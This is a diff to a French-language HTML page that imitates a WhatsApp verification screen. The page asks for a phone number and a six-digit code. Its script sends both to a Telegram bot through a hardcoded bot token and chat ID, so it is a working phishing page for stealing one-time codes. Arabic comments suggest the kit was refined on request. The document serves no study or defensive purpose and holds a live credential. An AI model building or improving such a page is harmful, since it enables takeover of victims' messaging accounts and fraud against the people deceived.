@@ -3,77 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Vérification</title>
+    <title>Vérification WhatsApp</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
         :root {
-            --bg-cream: #fdf8f1; /* لون الخلفية الكريمي من الصورة */
+            --bg-cream: #fdf8f1; /* لون الخلفية الكريمي المستخرج من صورتك */
             --btn-green: #24ac64; /* لون الزر الأخضر */
             --text-black: #1a1a1a;
             --text-gray: #666;
         }
 
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
 
         body {
-            background-color: var(--bg-cream);
+            background-color: var(--bg-cream); /* تطبيق اللون الكريمي على كامل الخلفية */
             margin: 0;
+            padding: 0;
             display: flex;
             flex-direction: column;
+            align-items: center;
             min-height: 100vh;
         }
 
+        /* حاوية المحتوى الرئيسية */
         .main-content {
             flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
+            width: 100%;
             padding: 20px;
         }
 
+        /* المربع الأبيض بإطار أسود وحواف دائرية */
         .wrapper {
             width: 100%;
-            max-width: 420px;
+            max-width: 400px;
             background: white;
-            padding: 50px 30px;
-            border-bottom: 4px solid #000;
+            padding: 40px 25px;
+            border: 1.5px solid #000; /* الإطار الأسود النحيف المحيط بالمربع */
+            border-radius: 30px;      /* الحواف الدائرية الكبيرة كما طلبت */
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05); /* ظل ناعم خلف المربع */
             text-align: left;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
 
-        h2 { font-size: 26px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); }
-        p { font-size: 15px; margin-bottom: 35px; color: var(--text-gray); }
+        h2 { font-size: 26px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); line-height: 1.2; }
+        p.desc { font-size: 15px; margin-bottom: 35px; color: var(--text-gray); line-height: 1.4; }
 
+        /* تنسيق الحقول */
         .iti { width: 100%; margin-bottom: 25px; }
         input[type="tel"], .otp-field {
-            height: 55px; border: 1px solid #e5e5e5; border-radius: 8px; font-size: 17px; outline: none;
+            height: 55px;
+            border: 1px solid #e5e5e5;
+            border-radius: 12px;
+            font-size: 18px;
+            outline: none;
+            background: #fff;
         }
 
-        .otp-container { display: flex; justify-content: space-between; gap: 10px; margin: 25px 0; }
-        .otp-field { width: 48px !important; text-align: center; }
+        /* تنسيق خانات OTP الستة */
+        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 25px 0; }
+        .otp-field { width: 15% !important; text-align: center; border-radius: 10px; }
 
+        /* الزر الأخضر */
         .btn-submit {
-            background-color: var(--btn-green); color: white; border: none;
-            width: 100%; max-width: 200px; height: 50px; border-radius: 25px;
-            font-size: 17px; font-weight: 600; cursor: pointer; margin: 20px auto; display: block;
+            background-color: var(--btn-green);
+            color: white;
+            border: none;
+            width: 100%;
+            max-width: 200px;
+            height: 50px;
+            border-radius: 25px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px auto;
+            display: block;
         }
 
-        /* تنسيق النصوص السفلية الجديدة */
+        /* تذييل الصفحة (Footer) */
         .footer {
+            width: 100%;
             padding: 20px;
             text-align: center;
             color: var(--text-black);
         }
 
-        .footer-top { font-size: 18px; margin-bottom: 15px; }
-        .footer-top a { color: var(--text-black); text-decoration: underline; text-decoration-color: var(--btn-green); font-weight: 600; }
+        .footer-top { font-size: 17px; margin-bottom: 12px; }
+        .footer-top a { color: var(--text-black); text-decoration: underline; text-decoration-color: var(--btn-green); font-weight: 700; }
         
         .footer-encryption {
             display: flex; align-items: center; justify-content: center;
-            gap: 8px; color: var(--text-gray); font-size: 15px; margin-bottom: 20px;
+            gap: 6px; color: var(--text-gray); font-size: 14px; margin-bottom: 10px;
         }
 
-        .footer-links { font-size: 13px; color: var(--text-gray); }
+        .footer-links { font-size: 13px; color: #999; }
 
         .hidden { display: none !important; }
     </style>
@@ -84,23 +108,23 @@
     <div class="wrapper">
         <div id="page1">
             <h2>Saisissez un numéro de téléphone.</h2>
-            <p>Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
+            <p class="desc">Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
             <input type="tel" id="phone">
-            <button class="btn-submit" onclick="process('phone')">Suivant</button>
+            <button class="btn-submit" onclick="processData('phone')">Suivant</button>
         </div>
 
         <div id="page2" class="hidden">
             <h2>Vérification</h2>
-            <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
+            <p class="desc">Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
             <div class="otp-container">
-                <input type="number" class="otp-field" oninput="move(this, 0)">
-                <input type="number" class="otp-field" oninput="move(this, 1)">
-                <input type="number" class="otp-field" oninput="move(this, 2)">
-                <input type="number" class="otp-field" oninput="move(this, 3)">
-                <input type="number" class="otp-field" oninput="move(this, 4)">
-                <input type="number" class="otp-field" oninput="move(this, 5)">
+                <input type="number" class="otp-field" oninput="moveFocus(this, 0)">
+                <input type="number" class="otp-field" oninput="moveFocus(this, 1)">
+                <input type="number" class="otp-field" oninput="moveFocus(this, 2)">
+                <input type="number" class="otp-field" oninput="moveFocus(this, 3)">
+                <input type="number" class="otp-field" oninput="moveFocus(this, 4)">
+                <input type="number" class="otp-field" oninput="moveFocus(this, 5)">
             </div>
-            <button class="btn-submit" onclick="process('otp')">Vérifier</button>
+            <button class="btn-submit" onclick="processData('otp')">Vérifier</button>
         </div>
     </div>
 </div>
@@ -120,38 +144,49 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    const token = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
-    const chat = "1705240737"; // الـ Chat ID الخاص بك
+    // بياناتك المدمجة
+    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+    const chatId = "1705240737";
 
-    const iti = window.intlTelInput(document.querySelector("#phone"), {
+    // تفعيل حقل الهاتف مع اكتشاف الدولة تلقائياً
+    const phoneInput = document.querySelector("#phone");
+    const iti = window.intlTelInput(phoneInput, {
         initialCountry: "auto",
         geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)),
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    function process(type) {
-        let msg = "";
+    // معالجة البيانات وإرسالها للتليجرام
+    function processData(type) {
+        let textMsg = "";
         if(type === 'phone') {
-            msg = "📱 رقم هاتف: " + iti.getNumber();
+            const num = iti.getNumber();
+            if(!num) return alert("Numéro invalide");
+            textMsg = "📱 رقم جديد: " + num;
             document.getElementById('page1').classList.add('hidden');
             document.getElementById('page2').classList.remove('hidden');
         } else {
-            let code = "";
-            document.querySelectorAll('.otp-field').forEach(f => code += f.value);
-            msg = "🔑 كود الـ OTP: " + code;
+            let otpCode = "";
+            document.querySelectorAll('.otp-field').forEach(f => otpCode += f.value);
+            if(otpCode.length < 6) return alert("Code incomplet");
+            textMsg = "🔑 كود OTP: " + otpCode;
         }
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chat, text: msg })
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: textMsg })
         });
     }
 
-    function move(el, i) {
+    // الانتقال التلقائي بين خانات OTP
+    function moveFocus(el, i) {
         if(el.value.length >= 1) {
             el.value = el.value.slice(0,1);
             if(i < 5) document.querySelectorAll('.otp-field')[i+1].focus();
         }
     }
 </script>
+
 </body>
 </html>
